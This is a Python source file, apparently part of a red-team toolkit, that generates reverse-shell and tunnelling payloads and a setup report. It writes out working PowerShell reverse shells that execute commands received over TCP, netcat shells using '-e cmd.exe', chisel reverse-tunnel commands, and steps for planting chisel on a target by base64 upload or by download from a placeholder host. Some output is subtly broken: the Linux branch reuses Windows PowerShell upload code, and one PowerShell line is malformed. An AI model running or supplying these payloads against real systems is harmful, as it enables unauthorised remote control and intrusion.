#!/usr/bin/env python3
"""
代理自动化搭建工具
支持 chisel、netcat 等内网穿透代理工具的自动化部署。
"""

import json
import os
import sys
import base64
import hashlib
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass


@dataclass
class ProxyConfig:
    """代理配置"""
    tool: str  # chisel / nc
    mode: str  # client / server
    local_ip: str
    local_port: int
    remote_port: int
    password: str = ""
    additional_args: str = ""


class ProxySetup:
    """代理搭建工具"""

    TOOLS_DIR = r"d:\mcp\redteam-tools"

    def __init__(self):
        self.tools = {
            'chisel': {
                'windows': os.path.join(self.TOOLS_DIR, 'chisel.exe'),
                'linux': os.path.join(self.TOOLS_DIR, 'chisel'),
            }
        }

    def get_tool_path(self, tool: str, os_type: str = 'windows') -> str:
        """获取工具路径"""
        if tool == 'chisel':
            return self.tools['chisel'].get(os_type, self.tools['chisel']['windows'])
        return ""

    def read_binary(self, filepath: str) -> bytes:
        """读取二进制文件"""
        with open(filepath, 'rb') as f:
            return f.read()

    def encode_base64(self, data: bytes) -> str:
        """Base64 编码"""
        return base64.b64encode(data).decode('utf-8')

    def calculate_hash(self, data: bytes) -> str:
        """计算 MD5 哈希"""
        return hashlib.md5(data).hexdigest()

    def generate_chisel_server_cmd(self, port: int = 8080, password: str = "") -> str:
        """生成 Chisel Server 命令"""
        cmd = f"chisel server --port {port}"
        if password:
            cmd += f" --auth {password}"
        return cmd

    def generate_chisel_client_cmd(self, server: str, port: int, remote_port: int,
                                   local_ip: str = "127.0.0.1", local_port: int = 22,
                                   password: str = "") -> str:
        """生成 Chisel Client 命令"""
        cmd = f"chisel client {server}:{port}"
        if password:
            cmd += f" --auth {password}"
        cmd += f" {local_ip}:{local_port}:127.0.0.1:{remote_port}"
        return cmd

    def generate_reverse_proxy_script(self, tool: str, target_ip: str,
                                      target_port: int, listen_port: int) -> str:
        """生成反向代理 PowerShell 脚本"""
        if tool.lower() == 'nc':
            # Netcat 反向 shell
            script = f'''$client = New-Object System.Net.Sockets.TCPClient("{target_ip}",{target_port})
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
while ($true) {{
    $cmd = $reader.ReadLine()
    if ($cmd -eq "exit") {{ break }}
    $result = (Invoke-Expression $cmd 2>&1 | Out-String)
    $writer.WriteLine($result)
    $writer.Flush()
}}
$writer.Close()
$reader.Close()
$client.Close()
'''
        else:
            script = f"# 不支持的工具: {tool}"
        return script

    def generate_bind_shell_script(self, tool: str, port: int) -> str:
        """生成正向连接脚本"""
        if tool.lower() == 'nc':
            script = f'''# Netcat 正向 shell 监听
nc -lvp {port} -e cmd.exe
'''
        else:
            script = f"# 不支持的工具: {tool}"
        return script

    def generate_payload(self, tool: str, target_ip: str, target_port: int,
                        listen_port: int, os_type: str = 'windows') -> Dict:
        """生成完整的代理Payload"""

        result = {
            'tool': tool,
            'target_os': os_type,
            'upload_instructions': '',
            'execute_commands': [],
            'verification_commands': [],
            'binary_info': {}
        }

        if tool.lower() == 'chisel':
            if os_type == 'windows':
                binary_path = self.get_tool_path('chisel', 'windows')
                if os.path.exists(binary_path):
                    binary_data = self.read_binary(binary_path)
                    result['binary_info'] = {
                        'filename': 'chisel.exe',
                        'size': len(binary_data),
                        'md5': self.calculate_hash(binary_data),
                        'base64': self.encode_base64(binary_data)[:200] + '...',
                        'total_base64_length': len(self.encode_base64(binary_data))
                    }
                    result['upload_instructions'] = f'''
=== Chisel Windows 上传说明 ===

【方法1: PowerShell Base64 上传】
$base64 = "{self.encode_base64(binary_data)}"
$bytes = [System.Convert]::FromBase64String($base64)
[System.IO.File]::WriteAllBytes("C:\\Windows\\Temp\\chisel.exe", $bytes)

【方法2: 直接复制】
如果目标机器可以访问网络，直接下载:
powershell -c "Invoke-WebRequest -Uri 'http://YOUR_IP/chisel.exe' -OutFile 'C:\Windows\Temp\chisel.exe'"
'''
                    result['execute_commands'] = [
                        # Server 模式
                        f"# 监听模式 (在攻击者机器执行): chisel.exe server --port {listen_port} --reverse",
                        # Client 模式
                        f"# 客户端模式 (目标机器执行): chisel.exe client YOUR_SERVER:{listen_port} 127.0.0.1:{target_port}:127.0.0.1:{target_port}",
                        # PowerShell 完整命令示例
                        f"powershell -c \"& '{{base64 -replace '''''',''''''}}'\""
                    ]
                    result['verification_commands'] = [
                        "chisel.exe --version",
                        f"netstat -an | findstr {listen_port}"
                    ]

            else:  # Linux
                binary_path = self.get_tool_path('chisel', 'linux')
                if os.path.exists(binary_path):
                    binary_data = self.read_binary(binary_path)
                    result['binary_info'] = {
                        'filename': 'chisel',
                        'size': len(binary_data),
                        'md5': self.calculate_hash(binary_data),
                    }
                    result['upload_instructions'] = f'''
=== Chisel Linux 上传说明 ===

【方法1: Base64 上传】
$base64 = "{self.encode_base64(binary_data)}"
$bytes = [System.Convert]::FromBase64String($base64)
[System.IO.File]::WriteAllBytes("C:\\Windows\\Temp\\chisel", $bytes)

【方法2: wget/curl 拉取】
curl -o /tmp/chisel http://YOUR_IP/chisel
chmod +x /tmp/chisel
'''
                    result['execute_commands'] = [
                        f"# 监听模式 (攻击者): ./chisel server --port {listen_port} --reverse",
                        f"# 客户端 (目标): ./chisel client YOUR_SERVER:{listen_port} 127.0.0.1:{target_port}:127.0.0.1:{target_port}",
                    ]

        elif tool.lower() == 'nc' or tool.lower() == 'netcat':
            result['binary_info'] = {
                'note': 'Netcat 通常目标机器自带，如需上传请手动准备'
            }
            result['upload_instructions'] = f'''
=== Netcat 代理搭建说明 ===

【正向连接 (目标监听，攻击者连接)】
目标机器: nc -lvp {listen_port} -e cmd.exe
攻击者:   nc {target_ip} {listen_port}

【反向连接 (攻击者监听，目标连接)】
攻击者:   nc -lvp {listen_port}
目标机器: nc {target_ip} {target_port} -e cmd.exe
'''
            result['execute_commands'] = [
                f"# 正向连接 (目标执行): nc -lvp {listen_port} -e cmd.exe",
                f"# 反向连接 (攻击者执行): nc -lvnp {listen_port}",
            ]

        elif tool.lower() == 'powershell':
            # PowerShell 反向代理
            script = self.generate_powershell_proxy(target_ip, target_port, listen_port)
            result['upload_instructions'] = f'''
=== PowerShell 反向 Shell ===

【攻击者监听】
nc -lvp {listen_port}

【目标执行】
'''
            result['execute_commands'] = [
                f"powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{target_ip}',{target_port});$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{{0}};while(($i = $stream.Read($buffer,0,$buffer.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
            ]

        return result

    def generate_powershell_proxy(self, target_ip: str, target_port: int, listen_port: int) -> str:
        """生成 PowerShell 反向 Shell 脚本"""
        script = f'''$client = New-Object System.Net.Sockets.TCPClient("{target_ip}", {target_port})
$stream = $client.GetStream()
$buffer = New-Object byte[] 65536
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {{
    $data = (New-Object System.Text.ASCIIEncoding).GetString($buffer,0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
        return script

    def generate_report(self, payload: Dict, target_ip: str, target_port: int,
                        listen_port: int, tool: str, os_type: str) -> str:
        """生成完整的代理搭建报告"""

        report = []
        report.append("=" * 70)
        report.append("           代理自动化搭建报告 (Proxy Setup Report)")
        report.append("=" * 70)
        report.append("")
        report.append(f"工具类型:      {tool.upper()}")
        report.append(f"目标系统:      {os_type.upper()}")
        report.append(f"目标 IP:       {target_ip}")
        report.append(f"目标端口:      {target_port}")
        report.append(f"监听端口:      {listen_port}")
        report.append("")

        # 二进制信息
        if payload.get('binary_info'):
            report.append("-" * 70)
            report.append("【1. 二进制文件信息】")
            report.append("-" * 50)
            for key, value in payload['binary_info'].items():
                if key == 'base64':
                    report.append(f"  {key}:   {value}")
                else:
                    report.append(f"  {key}:   {value}")
            report.append("")

        # 上传说明
        if payload.get('upload_instructions'):
            report.append("-" * 70)
            report.append("【2. 上传方法】")
            report.append("-" * 50)
            report.append(payload['upload_instructions'])
            report.append("")

        # 执行命令
        if payload.get('execute_commands'):
            report.append("-" * 70)
            report.append("【3. 执行命令】")
            report.append("-" * 50)
            for i, cmd in enumerate(payload['execute_commands'], 1):
                report.append(f"  {i}. {cmd}")
            report.append("")

        # 验证命令
        if payload.get('verification_commands'):
            report.append("-" * 70)
            report.append("【4. 验证命令】")
            report.append("-" * 50)
            for cmd in payload['verification_commands']:
                report.append(f"  - {cmd}")
            report.append("")

        # 快速参考
        report.append("-" * 70)
        report.append("【5. 快速参考】")
        report.append("-" * 50)
        report.append(f"""
  攻击者 (你自己的机器):
  =====================
  # 启动监听
  nc -lvp {listen_port}

  # 如果使用 chisel server
  chisel.exe server --port {listen_port} --reverse

  目标机器 (被控主机):
  =====================
  # 启动代理客户端
  [见上方执行命令]
""")
        report.append("=" * 70)
        report.append("                    报告生成完毕")
        report.append("=" * 70)

        return "\n".join(report)


def main():
    if len(sys.argv) < 2:
        print("用法:")
        print("  python proxy_setup.py chisel <目标IP> <目标端口> <监听端口> <操作系统>")
        print("  python proxy_setup.py nc <目标IP> <目标端口> <监听端口> <操作系统>")
        print("  python proxy_setup.py powershell <目标IP> <目标端口> <监听端口>")
        print("")
        print("示例:")
        print("  python proxy_setup.py chisel 1.2.3.4 8080 8080 windows")
        print("  python proxy_setup.py nc 1.2.3.4 4444 5555 windows")
        print("  python proxy_setup.py powershell 1.2.3.4 4444 4445")
        sys.exit(1)

    tool = sys.argv[1].lower()

    if len(sys.argv) >= 5:
        target_ip = sys.argv[2]
        target_port = int(sys.argv[3])
        listen_port = int(sys.argv[4])
        os_type = sys.argv[5].lower() if len(sys.argv) > 5 else 'windows'
    else:
        print("参数不足!")
        sys.exit(1)

    # 生成 payload
    setup = ProxySetup()
    payload = setup.generate_payload(tool, target_ip, target_port, listen_port, os_type)

    # 生成报告
    report = setup.generate_report(payload, target_ip, target_port, listen_port, tool, os_type)
    print(report)


if __name__ == "__main__":
    main()
